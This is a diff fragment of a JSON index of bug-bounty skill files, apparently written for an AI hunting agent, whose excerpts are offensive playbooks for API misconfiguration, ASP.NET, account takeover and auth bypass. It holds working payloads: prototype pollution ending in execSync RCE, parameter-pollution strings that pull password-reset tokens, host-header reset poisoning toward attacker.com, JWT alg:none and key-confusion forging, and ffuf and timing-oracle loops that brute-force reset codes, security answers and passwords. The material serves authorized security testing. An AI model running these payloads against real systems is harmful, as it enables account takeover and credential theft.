+            "quote": "Use this skill BEFORE capturing any screenshot, exporting any HAR, or attaching any evidence to a bug-bounty submission."
+          },
+          {
+            "field": "does",
+            "quote": "The session cookie value is the highest-value secret in any PoC."
+          },
+          {
+            "field": "does",
+            "quote": "Use `jq` to strip sensitive headers."
+          },
+          {
+            "field": "does",
+            "quote": "redact the actual PII even in private attachments"
+          },
+          {
+            "field": "prerequisites",
+            "quote": "Use `jq` to strip sensitive headers. Save this as a shell function or one-liner you can re-"
+          },
+          {
+            "field": "prerequisites",
+            "quote": "macOS: Open screenshot in Preview → Tools → Annotate → Rectangle → set fill color to black"
+          }
+        ]
+      }
+    },
+    {
+      "skill_path": "skills/hunt-api-misconfig/SKILL.md",
+      "blob_sha": "ca6d677caca6cb4c3723dd55c691ee0cc22c0109",
+      "source_url": "https://github.com/elementalsouls/Claude-BugHunter/blob/64410edb7f445e1837665e2fd713d47958a51094/skills/hunt-api-misconfig/SKILL.md",
+      "fetched_at": "2026-11-17T00:18:16.822Z",
+      "generated_at": null,
+      "model": null,
+      "status": "failed",
+      "last_error": "Skill card failed schema or evidence validation",
+      "card_prompt_version": "skill_card_v1",
+      "frontmatter": {
+        "name": "hunt-api-misconfig",
+        "description": "Hunt API security misconfiguration — mass assignment, prototype pollution, HTTP verb tampering. Mass assignment: send {is_admin:true, role:admin, verified:true} on profile/account/reset endpoints — server blindly applies. JWT signature/crypto forging (alg:none, key confusion, kid/jku) is owned by hunt-jwt-crypto; this skill covers only non-crypto JWT handling. Prototype pollution: __proto__ injection in JSON merge / Object.assign / lodash _.merge → polluted prototype reaches sink (RCE in Node, X"
+      },
+      "excerpt": "---\nname: hunt-api-misconfig\ndescription: \"Hunt API security misconfiguration — mass assignment, prototype pollution, HTTP verb tampering. Mass assignment: send {is_admin:true, role:admin, verified:true} on profile/account/reset endpoints — server blindly applies. JWT signature/crypto forging (alg:none, key confusion, kid/jku) is owned by hunt-jwt-crypto; this skill covers only non-crypto JWT handling. Prototype pollution: __proto__ injection in JSON merge / Object.assign / lodash _.merge → polluted prototype reaches sink (RCE in Node, XSS in browser). HTTP verb: GET-bypass-CSRF, X-HTTP-Method-Override, TRACE enabled. Detection: API responses with extra fields, JWTs in headers (decode at jwt.io). CORS misconfiguration (reflect-any-origin, null origin, subdomain-regex bypass, postMessage) is owned by hunt-cors. Use when hunting API misconfigs, mass-assignment, prototype pollution (JWT crypto → hunt-jwt-crypto).\"\nsources: hackerone_public, owasp_api_top10_2023, public_research\nreport_count: 0\n---\n\n## 12. API SECURITY MISCONFIGURATION\n\n### Mass Assignment\n```javascript\nUser.update(req.body)  // body has {\"role\": \"admin\"} → privilege escalation\n```\n\n### JWT None Algorithm\n```python\nheader = {\"alg\": \"none\", \"typ\": \"JWT\"}\npayload = {\"sub\": 1, \"role\": \"admin\"}\ntoken = base64(header) + \".\" + base64(payload) + \".\"  # no signature\n```\n\n### JWT RS256 → HS256 Algorithm Confusion\n```python\n# Get server's public key from /.well-known/jwks.json\n# Sign token with public key as HMAC secret\ntoken = jwt.encode({\"sub\": \"admin\", \"role\": \"admin\"}, pub_key, algorithm=\"HS256\")\n# Server uses RS256 key as HS256 secret → accepts it\n```\n\n### Prototype Pollution\n```javascript\n// Server-side — Node.js merge without protection\n{\"__proto__\": {\"admin\": true}}\n{\"constructor\": {\"prototype\": {\"admin\": true}}}\n// URL: ?__proto__[isAdmin]=true&__proto__[role]=superadmin\n```\n\nFor server-side prototype pollution, hunt for an object merge primitive first, then a sink. Favor\nJSON/object update endpoints such as profile, address, preferences, settings, cart, admin job, import,\nor webhook configuration. Do not stop at a 200 response to `__proto__`; prove that polluted prototype\nstate reaches a later operation.\n\nHunt sequence:\n\n1. **Find an object-update endpoint.** Prefer endpoints that accept many named fields or JSON objects.\n   Try both JSON and form encodings when the app accepts forms. Include CSRF/session fields when needed.\n2. **Pollute harmless marker properties.** Send variants such as:\n\n```\n{\"__proto__\":{\"polluted\":\"pp-1337\"}}\n{\"constructor\":{\"prototype\":{\"polluted\":\"pp-1337\"}}}\n__proto__[polluted]=pp-1337\nconstructor[prototype][polluted]=pp-1337\n```\n\n3. **Trigger a separate sink.** After pollution, request account/profile/admin/job/export/search/render\n   endpoints and compare with baseline. Strong signals include changed JSON defaults, unexpected fields,\n   server errors mentioning object properties, changed job output, template/render errors, or command/job\n   behavior changes.\n4. **Escalate only through learned sinks.** Candidate properties depend on the sink:\n\n```\n{\"__proto__\":{\"json spaces\":10}}\n{\"__proto__\":{\"status\":555}}\n{\"__proto__\":{\"isAdmin\":true,\"role\":\"admin\"}}\n{\"__proto__\":{\"shell\":\"/bin/bash\",\"argv0\":\"node\",\"NODE_OPTIONS\":\"--inspect\"}}\n{\"__proto__\":{\"execArgv\":[\"--eval\",\"process.mainModule.require('child_process').execSync('id')\"]}}\n```\n\n5. **For exfiltration labs or real impact, prefer non-destructive proof.** If an admin job, diagnostic,\n   export, or rendering endpoint consumes polluted defaults, use a marker or environment/secret read only\n   when authorized. In production, stop at a controlled marker unless scope explicitly permits data access.\n\n### Server-Side Parameter Pollution in Backend URL / REST URL Construction\n\nUse this when a frontend form or endpoint appears to call a server-side API on your behalf\n(password reset, account lookup, profile fetch, product lookup, stock check, search). The bug is not\nordinary client-side query pollution. The server takes your input and interpolates it into a backend\nURL path or query string, such as:\n\n```\n/api/internal/users/<username>/field/email\n/api/users/<id>\n/api/users?username=<username>&field=email\n```\n\nHunt sequence:\n\n1. **Find the flow and read the client request.** Fetch the page and any referenced JavaScript. Look\n   for form actions, `fetch(...)`, hidden CSRF fields, and the exact parameter name the browser sends.\n   If there is a reset/account form, test known usernames first to learn the normal success/error shape.\n2. **Determine whether input lands in a backend path or query.** Send URL metacharacters in the input:\n   `#`, `?`, `&x=y`, `/`, `../`, and encoded forms `%23`, `%3f`, `%26x=y`, `%2f`, `%2e%2e%2f`.\n   Distinct errors such as `Invalid route`, `API definition`, `unsupported field`, or changed returned\n   fields mean your value is being interpreted by a server-side URL router, not merely validated as text.\n3. **Use path traversal to move inside the server-side URL.** If `username/../other-user` changes the\n   referenced account, the input is in a REST path segment. Then try appending route fragments such as\n   `/field/email`, `/field/id`, `/field/username`, `/field/passwordResetToken`, and terminate the rest\n   of the original backend path with `#` or `%23` when the backend URL parser honors fragments.\n4. **Discover API documentation from errors.** When an error says to consult the API definition, probe\n   common documentation/spec paths: `/openapi.json`, `/swagger.json`, `/api-docs`, `/api/swagger.json`,\n   `/swagger/v1/swagger.json`, `/v3/api-docs`, and path-traversal variants that attempt to reach the\n   spec from the vulnerable backend route. A spec or descriptive route error tells you valid resources\n   and field names.\n5. **Exploit only to prove impact.** For password reset/account lookup flows, the strongest proof is a\n   sensitive field such as a reset token or secret for another user, then using that token in the normal\n   application flow to complete account takeover. Do not stop at `Invalid route`; use errors as routing\n   feedback.\n\nPayload patterns to try, adapted to the observed parameter name:\n\n```\nusername=administrator%23\nusername=administrator%3f\nusername=administrator%2f..%2fvictimuser\nusername=administrator/../victimuser\nusername=administrator/field/email%23\nusername=administrator/field/id%23\nusername=administrator/field/passwordResetToken%23\nusername=administrator%2ffield%2fpasswordResetToken%23\n```\n\n### CORS Exploitation\n```bash\n# Test: reflected origin + credentials\ncurl -s -I -H \"Origin: https://evil.com\" https://target.com/api/user/me\n# If: Access-Control-Allow-Origin: https://evil.com + Access-Control-Allow-Credentials: true\n# → CRITICAL: attacker reads credentialed responses\n```\n\n---\n\n## OData $filter / $select / $expand WAF-Blacklist Bypass (2024-2026 surface)\n\nOData (Open Data Protocol) is the query layer behind **SharePoint, Microsoft Dynamics 365 / Power Platform, SAP NetWeaver Gateway / Fiori,** and any ASP.NET WebAPI project using `Microsoft.AspNetCore.OData`. It exposes SQL-shaped query operators (`eq`, `ne`, `and`, `or`, `substringof`, `startswith`, `tolower`, `concat`, `replace`) that look SQL-ish but are NOT SQL — meaning keyword-blacklist WAFs routinely fail open on OData traffic.\n\n### Attack class 1 — Boolean-logic blind extraction via `startswith` / `substringof`\n\n```\nGET /_api/data/contacts?$filter=startswith(adx_identity_passwordhash,'a')\nGET /_api/data/contacts?$filter=startswith(adx_identity_passwordhash,'aa')\n```\n\nIterate prefix character-by-character; cardinality of the response (or `@odata.count`) is the boolean oracle that confirms the prefix is correct. No SQLi engine needed, no `'`/`--` characters — the WAF sees only legitimate OData keywords. Extracted Microsoft Dynamics 365 / Power Apps Portals **password hashes, names, emails, addresses, financial data** in Dec 2023; Microsoft patched May 2024. ([Stratus Security writeup](https://www.stratussecur",
+      "card": null
+    },
+    {
+      "skill_path": "skills/hunt-aspnet/SKILL.md",
+      "blob_sha": "e31a1ff06d7cc68218f7864b429a2250de3da95a",
+      "source_url": "https://github.com/elementalsouls/Claude-BugHunter/blob/64410edb7f445e1837665e2fd713d47958a51094/skills/hunt-aspnet/SKILL.md",
+      "fetched_at": "2026-11-17T00:18:16.822Z",
+      "generated_at": null,
+      "model": null,
+      "status": "failed",
+      "last_error": "Skill card failed schema or evidence validation",
+      "card_prompt_version": "skill_card_v1",
+      "frontmatter": {
+        "name": "hunt-aspnet",
+        "description": "Hunt ASP.NET-specific surface — ViewState deserialization (signed-only vs encrypted), machineKey recovery, dual-parser MAC-bypass anti-pattern, request-validator bypass, trace.axd/elmah.axd disclosure, load-balanced ViewState cross-node failures, SafeControl enumeration via reflection, customErrors mode=Off stack-trace leaks, classic Webforms .aspx/.asmx/.svc surface. Built for ASP.NET Webforms + WCF + SharePoint farms."
+      },
+      "excerpt": "---\nname: hunt-aspnet\ndescription: Hunt ASP.NET-specific surface — ViewState deserialization (signed-only vs encrypted), machineKey recovery, dual-parser MAC-bypass anti-pattern, request-validator bypass, trace.axd/elmah.axd disclosure, load-balanced ViewState cross-node failures, SafeControl enumeration via reflection, customErrors mode=Off stack-trace leaks, classic Webforms .aspx/.asmx/.svc surface. Built for ASP.NET Webforms + WCF + SharePoint farms.\nsources: github, authorized-engagement\nreport_count: 1\n---\n\n## Crown Jewel Targets\n\nASP.NET deserialization bugs pay among the highest amounts in bug bounty when they reach RCE. Even when patched, the disclosure-tier findings (signed-only ViewState, dual-parser differential, request-validator quirks) reliably pay Low-Medium.\n\n**Highest-value targets:**\n\n- **SharePoint farms** (any version — 2013/2016/2019/SE) — sign-only ViewState + permissive ToolPane.aspx + anonymous FormDigest creates the CVE-2025-53770 ToolShell precondition chain\n- **Telerik UI for ASP.NET AJAX** — `Telerik.Web.UI.WebResource.axd` is a documented RCE sink when keys leak (CVE-2017-11317, CVE-2017-11357, CVE-2019-18935)\n- **Classic ASP.NET Webforms enterprise apps** — banking portals, dealer portals, HR systems left on .NET Framework 4.x\n- **WCF services** (`*.svc?WSDL`) — often forgotten admin endpoints with looser auth than the main app\n- **Sitecore CMS** — ViewState + Sitecore-specific deserialization chains (CVE-2021-42237)\n- **DotNetNuke (DNN)** — historic ViewState RCE chains\n- **Umbraco CMS** — ViewState + custom deserialization sinks\n\n**Asset types that pay most:** internet-reachable ASP.NET Webforms apps > WCF admin services > Telerik-integrated sites > Classic ASP.NET MVC with VSF (very rare)\n\n---\n\n## Attack Surface Signals\n\n**Response headers indicating ASP.NET:**\n```\nX-AspNet-Version: 4.0.30319          (classic — disclosure on its own)\nX-Powered-By: ASP.NET\nX-AspNetMvc-Version: 5.2\nServer: Microsoft-IIS/10.0\nSet-Cookie: ASP.NET_SessionId=...\nSet-Cookie: .ASPXAUTH=...            (Forms auth cookie)\nSet-Cookie: .ASPXFORMSAUTH=...\nSet-Cookie: ASP.NET_SessionId=...; SameSite=None  (suggests cross-origin embedding)\n```\n\n**Body signals (in form HTML):**\n```\n<input type=\"hidden\" name=\"__VIEWSTATE\" id=\"__VIEWSTATE\" value=\"...\" />\n<input type=\"hidden\" name=\"__VIEWSTATEGENERATOR\" id=\"__VIEWSTATEGENERATOR\" value=\"...\" />\n<input type=\"hidden\" name=\"__VIEWSTATEENCRYPTED\" id=\"__VIEWSTATEENCRYPTED\" value=\"\" />\n                                        ↑ EMPTY = signed-only, not encrypted = exploitable if key leaks\n<input type=\"hidden\" name=\"__EVENTVALIDATION\" id=\"__EVENTVALIDATION\" value=\"...\" />\n<input type=\"hidden\" name=\"__REQUESTDIGEST\" id=\"__REQUESTDIGEST\" value=\"0x...,...\">\n                                        ↑ SharePoint CSRF token; if anon-issued, see hunt-sharepoint\n```\n\n**URL patterns to probe:**\n```\n/trace.axd                            (per-app trace viewer; sometimes anon-accessible)\n/elmah.axd                            (ELMAH error log viewer)\n/elmah.axd/?id=...                    (ELMAH RCE / stack-trace leak)\n/*.svc                                (WCF services)\n/*.svc?wsdl                           (WCF WSDL)\n/*.svc/mex                            (Metadata Exchange)\n/*.asmx                               (legacy SOAP)\n/*.asmx?WSDL                          (legacy SOAP description)\n/*.asmx?disco                         (legacy discovery)\n/Telerik.Web.UI.WebResource.axd       (Telerik AJAX components)\n/ChartImg.axd                         (DataVisualization controls; historic deserialization)\n/ScriptResource.axd                   (script resource handler; sometimes leaks paths)\n/WebResource.axd                      (web resource handler)\n/_vti_bin/*                           (SharePoint Web Service Forwarder)\n/api/                                 (Web API 2.x is ASP.NET on classic framework)\n/signin                               (often FedAuth / WS-Federation)\n```\n\n**Tech-stack signals:**\n- `Server: Microsoft-IIS/10.0` (or `/8.5`, `/7.5`) — confirmed Windows + IIS\n- `X-AspNet-Version` header — classic .NET Framework (4.x); .NET Core/5+ does NOT emit this\n- Cookies with `ASP.NET_SessionId`, `.ASPXAUTH`, `FedAuth` — Forms or claims auth\n- `__VIEWSTATE` in form bodies — Webforms (NOT MVC, NOT Razor Pages, NOT Blazor)\n- `MicrosoftSharePointTeamServices` header (sometimes stripped by ELB but leaks in `start.aspx` body) — SharePoint\n\n---\n\n## Step-by-Step Hunting Methodology\n\n1. **Fingerprint the framework version.** Trigger any 500 error (stale ViewState POST is a reliable way) and look for `Version Information: Microsoft .NET Framework Version:X.X.XXXXX; ASP.NET Version:X.X.XXXX.X` in the error body. This banner discloses both the runtime and ASP.NET-version-specific patch level. .NET 4.0.30319 + ASP.NET 4.8.x is the most common modern combination.\n\n2. **Locate every form with `__VIEWSTATE`.** Spider the target and grep for `name=\"__VIEWSTATE\"`. Each is a candidate sink for deserialization attacks if MAC / encryption is bypassable.\n\n3. **Check `__VIEWSTATEENCRYPTED` value.** Empty (`value=\"\"`) means ViewState is signed-only via `<machineKey>` but NOT encrypted. Recovery of the validation key → arbitrary deserialization. Non-empty (`value=\"something\"`) means ViewState is BOTH signed and encrypted; both keys needed to forge.\n\n4. **Test the ViewState parser-error differential** (the dual-parser anti-pattern). Send 7+ ViewState shapes and classify responses:\n   - Trivial garbage (`AAAA`) → `\"Validation of viewstate MAC failed\"`\n   - Real prefix from current page → `\"Validation of viewstate MAC failed\"`\n   - Flipped-bit real ViewState → `\"Validation of viewstate MAC failed\"`\n   - Oversize (`A * 100000`) → `\"Validation of viewstate MAC failed\"`\n   - XML-shaped (`<xss/>`) → **\"The state information is invalid for this page and might be corrupted\"** ← different parser path\n   - LosFormatter-style prefix (`/wEPDwUKMTcxNzgyOTQwMmRkkz9p4lzA...`) → **\"The state information is invalid for this page and might be corrupted\"**\n\n   The differential proves there are **two distinct deserialization entry points**, one of which dispatches BEFORE the MAC check on some payload shapes. Historically this enables MAC-before-parse-bypass exploits.\n\n5. **Look for load-balanced cross-node ViewState MAC failures.** If POST gets a 500 with `\"Validation of viewstate MAC failed. If this application is hosted by a Web Farm or cluster, ensure that <machineKey> configuration specifies the same validationKey...\"`, the farm has multiple WFEs WITHOUT machineKey sync, or without sticky-session affinity. Operationally this breaks legit users; security-wise it confirms farm topology.\n\n6. **Probe `trace.axd` and `elmah.axd`.** If either returns 200 anonymously, it's a Critical finding (trace leaks every request + headers + form data; ELMAH leaks every server error including stack traces).\n\n7. **Enumerate WCF services (`.svc`).** For each, fetch `?wsdl` and `?mex` (metadata exchange). MEX endpoints sometimes return full service contracts including admin operations.\n\n8. **Test request-validator bypass.** ASP.NET's request validator blocks `<` in query strings by default. Bypass categories that may still get through:\n   - HTML-entity-encoded payloads (`&lt;script&gt;` — but these don't execute)\n   - Encoded inside JSON / XML POST bodies (different content-type ≠ same validator)\n   - In path segments (not query) — validator scope depends on framework version\n   - In Cookie / Referer headers (varies)\n   - Inside `<%@ ... %>` ASP directives if reached via WebDAV PUT (rare)\n\n9. **Check `customErrors` mode.** If 500s expose full stack traces, framework versions, file paths, internal method names → `customErrors mode=\"Off\"` is set. Should be `RemoteOnly` for production.\n\n10. **Look for Telerik components.** `Telerik.Web.UI.WebResource.axd?type=rau` is the historic upload-to-RCE chain (CVE-2017-11317). The `dialogParametersHolder` parameter chain (CVE-2019-18935) requires ",
+      "card": null
+    },
+    {
+      "skill_path": "skills/hunt-ato/SKILL.md",
+      "blob_sha": "a1ffc0b90ca17fa198bdd29ac4ed66368d7020f6",
+      "source_url": "https://github.com/elementalsouls/Claude-BugHunter/blob/64410edb7f445e1837665e2fd713d47958a51094/skills/hunt-ato/SKILL.md",
+      "fetched_at": "2026-11-17T00:18:16.822Z",
+      "generated_at": null,
+      "model": null,
+      "status": "failed",
+      "last_error": "Skill card failed schema or evidence validation",
+      "card_prompt_version": "skill_card_v1",
+      "frontmatter": {
+        "name": "hunt-ato",
+        "description": "Hunt account takeover taxonomy — 9 distinct paths to ATO, plus chains. Paths: (1) password reset flaws (host-header injection redirects token, predictable/numeric token, Referer leak, no-expiry/reuse), (2) email change without re-auth, (3) OAuth account-link CSRF, (4) MFA bypass (per hunt-mfa-bypass), (5) session fixation, (6) JWT manipulation (forge token to another identity; crypto details → hunt-jwt-crypto), (7) password change without step-up (chain with login timing/length oracle), (8) soci"
+      },
+      "excerpt": "---\nname: hunt-ato\ndescription: \"Hunt account takeover taxonomy — 9 distinct paths to ATO, plus chains. Paths: (1) password reset flaws (host-header injection redirects token, predictable/numeric token, Referer leak, no-expiry/reuse), (2) email change without re-auth, (3) OAuth account-link CSRF, (4) MFA bypass (per hunt-mfa-bypass), (5) session fixation, (6) JWT manipulation (forge token to another identity; crypto details → hunt-jwt-crypto), (7) password change without step-up (chain with login timing/length oracle), (8) social-recovery / security-question brute-force, (9) SSO subdomain takeover at OAuth redirect_uri. Chains: cookie theft + password oracle + no step-up = persistent ATO; lax redirect_uri = auth-code theft; dangling-CNAME takeover at redirect_uri = ATO. Validate: demonstrate real takeover of test account B from attacker A's session; OOB/Collaborator confirm blind token-leak steps. Use when hunting ATO chains, testing password reset / email change / MFA / OAuth / session / JWT, or chaining primitives toward Critical.\"\nsources: hackerone_public, public_research\nreport_count: 7\n---\n\n## 13. ATO — ACCOUNT TAKEOVER TAXONOMY\n> 9 distinct paths. ATO is a destination class, not a single bug — each path below is a primitive that becomes Critical only when you demonstrate takeover of a SECOND account (test account B) you do not control, from attacker A's session/IP/device. A path that only locks you out of your own account, or only works when you already hold the victim's password AND session, is not a standalone ATO.\n\n### Path 1: Password Reset Poisoning (Host-Header)\n```bash\nPOST /forgot-password HTTP/1.1\nHost: attacker.com                 # primary Host swap\n# OR keep real Host and add one of:\nX-Forwarded-Host: attacker.com\nX-Host: attacker.com\nX-Forwarded-Server: attacker.com\n# OR dual-Host smuggling:  Host: target.com\\r\\nHost: attacker.com\n\nemail=victimB@company.com\n```\nThe reset mailer builds the link from the request Host header → link points to `attacker.com/reset?token=XXXX`. **Confirmation = OOB, not response-based:** point the header at a Burp Collaborator / unique DNS name and read the actual email (use a controlled victim B inbox you own for the test). If the token only appears in the email body that lands at your Collaborator host, you have proof.\n**False-positive killer:** many apps put `attacker.com` in the email but the actual link domain is server-pinned — read the email, do not infer from the reflected header.\n\n### Path 2: Reset Token in Referer / Open-Redirect Leak\n```\nGET /reset-password?token=ABC123\n→ page loads third-party resource: <script src=\"https://analytics.com/t.js\">\n→ browser sends  Referer: https://target.com/reset-password?token=ABC123\n→ token exfiltrated to every off-origin host the page calls\n```\nAlso test reset pages that 302 to an open redirect carrying the token in the URL. **Proof:** capture the outbound request in the Network tab (or Collaborator if you control the off-origin host) showing the full token in the Referer. Mitigated by `Referrer-Policy: no-referrer` + tokens in POST body — note their absence.\n\n### Path 3: Predictable / Weak Reset Tokens\n```bash\n# 6-digit numeric OTP-style reset code, no rate limit:\nffuf -u \"https://target.com/api/reset/verify\" -X POST \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"email\":\"victimB@company.com\",\"code\":\"FUZZ\"}' \\\n  -w <(seq -w 000000 999999) -mc 200 -fr \"invalid\" -t 5\n# time-based tokens: capture 5 tokens, diff — md5(timestamp)/sequential int = predictable\n```\n**Discipline:** request the victim-B token yourself (you own B), confirm entropy by sampling, THEN show a fresh brute lands. A rate-limit-only finding on `/forgot-password` is routinely rejected — the impact is token guessing, not request flooding.\n\n### Path 4: Token No-Expiry / Reuse / Cross-Account\n```\nExpiry:  request token → wait 2h → still valid? = bug\nReuse:   use token once → use again → still valid? = bug\nMulti:   request token#1, then token#2 → is token#1 still valid? (should be invalidated)\nCross:   does B's token reset A's password if you swap the userid/email param? = IDOR-in-reset\n```\n\n### Path 5: Email Change Without Re-Auth\n```bash\nPUT /api/user/email HTTP/1.1\nCookie: session=ATTACKER_A_SESSION\n{\"new_email\":\"attacker@evil.com\"}     # no current_password, no OTP, no email-confirm\n```\nIf the change takes effect with no current-password challenge and no confirm-link to the OLD address, trigger password reset → reset lands at attacker mailbox → ATO. The strongest variant skips even the new-address confirmation. Branded pattern: account-link / email-change → ATO via missing re-auth.\n\n### Path 6: JWT Manipulation\n```bash\n# (a) alg:none — strip the signature, set header alg to none\npython3 -c \"import jwt; print(jwt.encode({'sub':'victimB','role':'admin'}, key='', algorithm='none'))\"\n# send: header {\"alg\":\"none\",\"typ\":\"JWT\"}, payload {\"sub\":\"victimB\"}, empty signature\n#\n# (b) RS256 -> HS256 key confusion: re-sign with the server's PUBLIC key as the HMAC secret\ncurl -s https://target.com/.well-known/jwks.json   # or /oauth/.well-known/...  grab the RSA pub key\n# convert JWK -> PEM, then sign HS256 using that PEM bytes as the secret -> server verifies it\n#\n# (c) weak HMAC secret: crack offline\nhashcat -a 0 -m 16500 token.jwt rockyou.txt   # -m 16500 = JWT\n#\n# (d) kid injection: kid=../../../dev/null (empty key) or kid=' UNION SELECT 'secret -- (SQL-backed kid)\n```\n**Verified grounding for this class:** [CVE-2015-9235](https://nvd.nist.gov/vuln/detail/CVE-2015-9235) (node `jsonwebtoken` <4.2.2 — alg confusion / none bypass), [CVE-2016-10555](https://nvd.nist.gov/vuln/detail/CVE-2016-10555) (`jwt-simple` RS256→HS256). **Validate:** forged token must reach a privileged endpoint as victim B (e.g. `GET /api/admin` or `/api/users/B`) — decoding/forging is not impact; an authorized action under B's identity is. If the server ignores the forged `sub` and keys off the session cookie, the JWT is not the trust boundary — no finding.\n\n### Path 7: Password Change Without Step-Up + Login Oracle\n```bash\n# (a) password-change endpoint accepts a new password with no current-password / no MFA challenge:\nPOST /api/account/password\nCookie: session=STOLEN_B_COOKIE        # from XSS, session-fixation, or token leak\n{\"new_password\":\"Pwned#2026\"}          # no \"current_password\" field\n#\n# (b) login oracle to find a valid password without an existing cookie — measure response delta:\nfor p in $(cat candidates.txt); do\n  t=$(curl -s -o /dev/null -w '%{time_total}' -d \"user=victimB&pass=$p\" https://target.com/login)\n  printf '%s\\t%s\\n' \"$t\" \"$p\"\ndone | sort -n     # bcrypt-vs-fast-reject timing gap, or response-length diff, leaks valid pass\n```\nA no-step-up password-change endpoint is the **persistence multiplier**: cookie theft (transient) + this = attacker sets a new password from the stolen cookie → owns B from any device/IP, victim locked out. **False-positive check:** confirm there is genuinely no current-password / MFA gate — many APIs accept the field as optional but still 403 server-side; replay without the field and read the actual state change (try logging in with the new password from a clean browser).\n\n### Path 8: Social-Recovery / Security-Question Abuse\n```bash\n# Security answers are low-entropy and often unthrottled. Brute the recovery-answer endpoint:\nffuf -u \"https://target.com/account/recover/answer\" -X POST \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"email\":\"victimB@company.com\",\"question\":\"pet\",\"answer\":\"FUZZ\"}' \\\n  -w common-answers.txt -mc 200 -fr \"incorrect\" -t 5\n# also test: answers returned/echoed in /api/me or recovery page source (client-side check)\n# and: question itself reveals PII the answer to which is OSINT-able (mother maiden, first school)\n```\nPair with `offensive-osint`: many \"secret\" answers (birth city, pet, school) are public on social profiles → no brute needed. **Validate** by completing the recovery flow end-to-end into a session on account B.\n\n### Path 9: SSO Subdomain Takeov",
+      "card": null
+    },
+    {
+      "skill_path": "skills/hunt-auth-bypass/SKILL.md",
+      "blob_sha": "3a03d38cb63e21950f72af6d56baddad7e70955f",
+      "source_url": "https://github.com/elementalsouls/Claude-BugHunter/blob/64410edb7f445e1837665e2fd713d47958a51094/skills/hunt-auth-bypass/SKILL.md",
+      "fetched_at": "2026-11-17T00:18:16.822Z",
+      "generated_at": "2026-11-17T00:18:16.822Z",
+      "model": "deepseek-flash",
+      "status": "ok",
+      "last_error": null,
+      "card_prompt_version": "skill_card_v1",
+      "frontmatter": {
+        "name": "hunt-auth-bypass",
+        "description": "Hunting skill for auth bypass vulnerabilities. Built from 12 public bug bounty reports across SAML XSW / parser-differential (GitHub Enterprise CVE-2025-25291/25292), SAML signature stripping (Uber, Rocket.Chat, samlify CVE-2025-47949), SAML domain enforcement bypass via control characters (HackerOne 2024), partner-portal cross-IdP assertion reuse (Slack), WordPress XMLRPC bypassing SSO (Uber), JWT alg-confusion HS256/RS256 (Jitsi), JWT signature-validation skip (Linktree, Newspack), and token-a"
+      },
+      "excerpt": "---\nname: hunt-auth-bypass\ndescription: Hunting skill for auth bypass vulnerabilities. Built from 12 public bug bounty reports across SAML XSW / parser-differential (GitHub Enterprise CVE-2025-25291/25292), SAML signature stripping (Uber, Rocket.Chat, samlify CVE-2025-47949), SAML domain enforcement bypass via control characters (HackerOne 2024), partner-portal cross-IdP assertion reuse (Slack), WordPress XMLRPC bypassing SSO (Uber), JWT alg-confusion HS256/RS256 (Jitsi), JWT signature-validation skip (Linktree, Newspack), and token-audience confusion (Argo CD CVE-2023-22482). For standalone JWT signature/crypto forging (alg:none, key confusion, kid/jku) see hunt-jwt-crypto; this skill covers JWT only inside SSO/SAML/token-trust bypass chains. SAML assertion-layer attacks (XSW, comment injection, signature stripping, XXE-in-assertion) are owned by hunt-saml; this skill owns the broader cross-protocol auth-bypass taxonomy. Use when hunting auth bypass — see the Legacy-Protocol Matrix for branded-UI vs legacy-endpoint patterns.\nsources: github, hackerone_public, github_security_lab, projectdiscovery_research\nreport_count: 12\n---\n\n## Crown Jewel Targets\n\nAuth bypass is consistently one of the highest-paying vulnerability classes in bug bounty because it directly violates the most fundamental security control. High-value targets include:\n\n- **SSO/SAML implementations** at enterprise SaaS companies (Slack, Okta, OneLogin integrations) — payouts regularly in the $5K–$25K+ range\n- **Admin panels and partner/internal portals** — subdomain-separated admin surfaces like `partners.shopify.com`, `admin.company.com`\n- **Third-party auth plugin integrations** — WordPress plugins (OneLogin, WP-SAML-Auth), Drupal SSO modules, any CMS with pluggable auth\n- **XMLRPC endpoints** on WordPress — often forgotten, bypasses standard WP auth flows entirely\n- **OAuth callback flows** — state parameter mishandling, redirect_uri mismatches\n- **API authentication layers** — especially where auth was bolted on after the fact\n\n**Asset priority:** Targets with federated identity (SAML, OAuth, OIDC) connected to large user populations. Partner/reseller portals are particularly juicy because they often have elevated permissions and less security scrutiny than the main product.\n\n---\n\n### SSH certificate-authority trust forgery (Git-hosting / enterprise platforms)\nWhen an org or instance registers an SSH certificate authority, cert `principals` may not be bound server-side to the requesting identity — a member can mint a cert asserting another user's principal and authenticate as them (e.g. modify another user's resource given only its URL). Add SSH-CA trust to the auth-surface list on Git-hosting targets; niche/platform-specific. Disclosed: reports/1901040.\n\n## Attack Surface Signals\n\n**URL patterns to hunt:**\n```\n/xmlrpc.php\n/wp-login.php\n/saml/\n/sso/\n/auth/saml/callback\n/oauth/callback\n/partners.*\n/admin.*\n/?wc-api=\n/api/v*/auth\n/login?redirect=\n/accounts/login\n```\n\n**Response headers signaling SSO:**\n```\nX-Frame-Options: SAMEORIGIN (common on SSO portals)\nSet-Cookie: SAMLResponse=\nLocation: https://idp.company.com/saml\nWWW-Authenticate: Bearer realm=\"partners\"\n```\n\n**JS patterns indicating federated auth:**\n```javascript\n// Look for in page source\nsamlRequest\nRelayState\nSAMLResponse\nonelogin\nshibboleth\nokta\npassport.js authenticate\n```\n\n**Tech stack signals:**\n- WordPress + any SSO plugin → check XMLRPC separately\n- Shopify Partner API exposure → cross-tenant privilege escalation risk\n- Any app advertising \"SSO enabled\" or \"Login with [Enterprise IdP]\"\n- Separate subdomains for admin/partner that share session cookies with main domain\n- Applications using `SimpleSAMLphp`, `ruby-saml`, `python-saml`\n\n**Burp passive scan triggers:**\n- `SAMLResponse` in any POST body\n- `openid_connect` or `id_token` in responses\n- Cookie domains set to `.company.com` (wildcard)\n\n---\n\n## Step-by-Step Hunting Methodology\n\n1. **Map all authentication entry points**\n   - spider the target for every login surface: main login, admin login, API login, partner portal, mobile API endpoints\n   - check `robots.txt`, JS files, and the wayback machine for forgotten endpoints like `/xmlrpc.php`\n\n2. **Identify the auth mechanism per entry point**\n   - Is it forms-based, SAML, OAuth, API key, session token?\n   - For WordPress: always probe `/xmlrpc.php` even if the main login is SSO-protected\n\n3. **Test XMLRPC independently of SSO**\n   - If site uses SSO (e.g., OneLogin), manually POST to `/xmlrpc.php`\n   - XMLRPC uses WordPress-native credentials, not SSO — test with `system.listMethods` first, then `wp.getUsersBlogs`\n\n4. **Enumerate SAML implementation**\n   - Capture a valid SAMLResponse via Burp\n   - Decode the Base64 payload, inspect the XML\n   - Test signature stripping, comment injection, and XML wrapping attacks\n   - Test if SP validates the signature at all (send 